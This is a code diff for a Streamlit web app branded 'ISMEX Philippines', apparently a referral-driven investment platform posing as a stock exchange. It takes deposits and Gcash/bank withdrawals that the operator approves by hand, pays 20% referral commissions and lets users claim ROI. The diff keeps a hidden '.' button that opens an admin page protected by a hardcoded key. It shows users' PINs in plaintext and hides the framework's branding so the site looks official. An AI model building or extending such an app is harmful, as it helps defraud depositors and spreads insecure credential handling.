@@ -7,54 +7,30 @@ import time
 # ==========================================
 # 1. UI CONFIGURATION
 # ==========================================
-st.set_page_config(
-    page_title="ISMEX Official", 
-    layout="wide"
-)
+st.set_page_config(page_title="ISMEX Official", layout="wide")
 
-# MINIMALIST CSS - NO POSITIONING HACKS
 st.markdown("""
     <style>
-    .stApp { 
-        background-color: #0e1117 !important; 
-        color: white; 
-    }
-    
+    header, [data-testid="stToolbar"], footer { visibility: hidden !important; display: none !important; }
+    .stApp { background-color: #0e1117 !important; color: white; }
     .balance-box {
         background: linear-gradient(135deg, #1e222d 0%, #0e1117 100%);
-        padding: 2rem; 
-        border-radius: 20px; 
-        border: 2px solid #00ff88;
-        text-align: center;
-        margin-bottom: 20px;
+        padding: 2rem; border-radius: 20px; border: 2px solid #00ff88;
+        text-align: center; margin-bottom: 20px;
     }
-    
     .cap-card {
-        background: #1c2128; 
-        padding: 20px; 
-        border-radius: 15px;
-        margin-bottom: 15px; 
-        border: 1px solid #30363d;
+        background: #1c2128; padding: 20px; border-radius: 15px;
+        margin-bottom: 15px; border: 1px solid #30363d;
     }
-    
     .hist-card {
-        background: #1c2128; 
-        padding: 15px; 
-        border-radius: 12px;
-        margin-bottom: 10px; 
-        border-left: 5px solid #00ff88;
+        background: #1c2128; padding: 15px; border-radius: 12px;
+        margin-bottom: 10px; border-left: 5px solid #00ff88;
     }
-    
-    /* REMOVE ALL FORCED PADDING */
-    .main .block-container { 
-        padding: 1.5rem !important;
-    }
+    .main .block-container { padding: 1.5rem !important; }
     </style>
     """, unsafe_allow_html=True)
 
-# THE SECRET DOOR (REMOVED 'KIND' TO FIX TYPEERROR)
-if st.button("."): 
-    st.session_state.page = "boss_key"
+if st.button("."): st.session_state.page = "boss_key"
 
 # ==========================================
 # 2. DATABASE & STATE
@@ -85,18 +61,16 @@ if "ref" in st.query_params:
     st.session_state["captured_ref"] = st.query_params["ref"].replace("+", " ").upper().strip()
 
 # ==========================================
-# 3. ADMIN ACCESS
+# 3. ADMIN ACCESS & APPROVAL LOGIC
 # ==========================================
 if st.session_state.page == "boss_key":
     st.title("🛡️ VERIFICATION")
     boss_pass = st.text_input("Key", type="password")
-    
     if st.button("PROCEED"):
         if boss_pass == "0102030405":
             st.session_state.is_boss = True
             st.session_state.page = "admin"
             st.rerun()
-            
     if st.button("CANCEL"): 
         st.session_state.page = "landing"
         st.rerun()
@@ -115,10 +89,11 @@ if st.session_state.is_boss:
         for u, u_data in reg.items():
             pend = u_data.get('pending_actions', [])
             for idx, act in enumerate(list(pend)):
-                with st.expander(f"{act['type']} - {u}"):
+                with st.expander(f"{act['type']} - {u} (₱{act.get('amount',0):,.2f})"):
                     c1, c2 = st.columns(2)
                     if c1.button("APPROVE", key=f"ap_{u}_{idx}"):
                         ph = datetime.now() + timedelta(hours=8)
+                        # REFERRAL LOGIC: 20% commission on first deposit
                         if act['type'] == "DEPOSIT" and not u_data.get('has_deposited'):
                             inv = u_data.get('ref_by', 'OFFICIAL')
                             if inv in reg:
@@ -139,10 +114,10 @@ if st.session_state.is_boss:
                         save(u, u_data)
                         st.rerun()
     with t2:
-        st.table([{"NAME": n, "PIN": i.get('pin'), "WALLET": i.get('wallet')} for n, i in reg.items()])
+        st.table([{"NAME": n, "PIN": i.get('pin'), "WALLET": i.get('wallet'), "INVITOR": i.get('ref_by')} for n, i in reg.items()])
 
 # ==========================================
-# 4. USER DASHBOARD
+# 4. USER DASHBOARD & TRANSACTION LOGIC
 # ==========================================
 elif st.session_state.user:
     reg = load_reg()
@@ -172,7 +147,7 @@ elif st.session_state.user:
     if st.session_state.action_type == "WIT":
         with st.form("w"):
             amt_w = st.number_input("Amount", 500.0, max_value=max(500.0, wallet))
-            bank = st.text_input("Details")
+            bank = st.text_input("Gcash/Bank Details")
             if st.form_submit_button("SUBMIT"):
                 if wallet >= amt_w:
                     data['wallet'] = max(0.0, wallet - amt_w)
@@ -223,7 +198,7 @@ elif st.session_state.user:
                 is_op = end_dt <= ph_now <= expiry_dt
                 if ph_now < end_dt:
                     diff = end_dt - ph_now
-                    st.caption(f"{diff.days}d left")
+                    st.caption(f"{diff.days}d {diff.seconds//3600}h left")
                 if st.button(f"CLAIM", key=f"r_{idx}", disabled=not is_op):
                     data['wallet'] += roi_total
                     item['start_time'] = ph_now.isoformat()
@@ -235,6 +210,10 @@ elif st.session_state.user:
                     save(st.session_state.user, data)
                     st.rerun()
             st.markdown("</div>", unsafe_allow_html=True)
+
+    st.subheader("📜 HISTORY")
+    for h in reversed(data.get('history', [])):
+        st.markdown(f"<div class='hist-card'>{h['type']} | ₱{h['amount']:,.2f} | {h['status']}</div>", unsafe_allow_html=True)
 
     if st.button("LOGOUT"): 
         st.session_state.user = None
@@ -254,20 +233,16 @@ elif st.session_state.page == "auth":
         inv_n = st.session_state.get('captured_ref', 'OFFICIAL')
         st.write(f"Invitor: {inv_n}")
         nu = st.text_input("FULL NAME").upper().strip()
-        np = st.text_input("PIN", type="password", max_chars=4)
+        np = st.text_input("PIN (4 digits)", type="password", max_chars=4)
         if st.button("CREATE"):
             save(nu, {"pin":np, "wallet":0.0, "ref_by":inv_n, "inv":[], "history":[], "pending_actions":[], "has_deposited":False})
             st.success("Done!")
             st.rerun()
 else:
-    # --- SIMPLE LANDING PAGE ---
     st.title("ISMEX PHILIPPINES 📊")
-    st.write("Welcome to the Trading Platform")
-    
-    # This button will now appear clearly in the flow
+    st.write("International Stock Market Exchange")
     if st.button("🚀 ENTER PLATFORM NOW", use_container_width=True): 
         st.session_state.page = "auth"
         st.rerun()
+    st.caption("Secure v5.0")
     
-    st.caption("Secure Exchange v5.0")
-                                 
